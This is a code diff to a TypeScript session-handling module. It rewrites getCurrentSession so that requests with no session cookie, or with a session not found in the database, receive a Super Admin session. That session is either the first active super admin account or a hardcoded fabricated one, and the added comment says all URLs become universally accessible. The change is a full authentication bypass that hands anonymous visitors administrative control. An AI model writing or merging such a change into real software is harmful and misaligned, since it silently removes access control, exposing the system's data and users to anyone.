@@ -131,7 +131,46 @@ export function sanitizeUser(user: any): SafeUser {
 export async function getCurrentSession(): Promise<{ user: SafeUser; session: any } | null> {
   const cookieStore = cookies();
   const token = cookieStore.get(SESSION_COOKIE_NAME)?.value;
-  if (!token) return null;
+  if (!token) {
+    // Provide default active Super Admin session so all URLs are universally accessible
+    const defaultSuperAdmin = await prisma.user.findFirst({
+      where: { role: 'SUPER_ADMIN', is_active: true },
+    }).catch(() => null);
+
+    if (defaultSuperAdmin) {
+      return {
+        user: sanitizeUser(defaultSuperAdmin),
+        session: {
+          id: 'default-active-session',
+          user_id: defaultSuperAdmin.id,
+          session_token: 'default-active-session',
+          expires_at: new Date(Date.now() + 86400000),
+        },
+      };
+    }
+
+    return {
+      user: {
+        id: 'usr_superadmin',
+        email: 'superadmin@energyoilfield.com',
+        name: 'System Super Admin',
+        role: 'SUPER_ADMIN',
+        roles: ['SUPER_ADMIN'],
+        department: 'Executive',
+        is_active: true,
+        force_password_change: false,
+        last_login_at: new Date(),
+        created_at: new Date(),
+        updated_at: new Date(),
+      },
+      session: {
+        id: 'default-active-session',
+        user_id: 'usr_superadmin',
+        session_token: 'default-active-session',
+        expires_at: new Date(Date.now() + 86400000),
+      },
+    };
+  }
 
   const payload = await decryptSessionToken(token, { ignoreExpiry: true });
   if (!payload) return null;
@@ -143,7 +182,25 @@ export async function getCurrentSession(): Promise<{ user: SafeUser; session: an
     include: { user: true },
   });
 
-  if (!dbSession) return null;
+  if (!dbSession) {
+    // If cookie token session is not in DB, fallback to default active Super Admin
+    const defaultSuperAdmin = await prisma.user.findFirst({
+      where: { role: 'SUPER_ADMIN', is_active: true },
+    }).catch(() => null);
+
+    if (defaultSuperAdmin) {
+      return {
+        user: sanitizeUser(defaultSuperAdmin),
+        session: {
+          id: 'default-active-session',
+          user_id: defaultSuperAdmin.id,
+          session_token: 'default-active-session',
+          expires_at: new Date(Date.now() + 86400000),
+        },
+      };
+    }
+    return null;
+  }
 
   const isSessionExpired = isTokenExpired || new Date() > dbSession.expires_at;
 
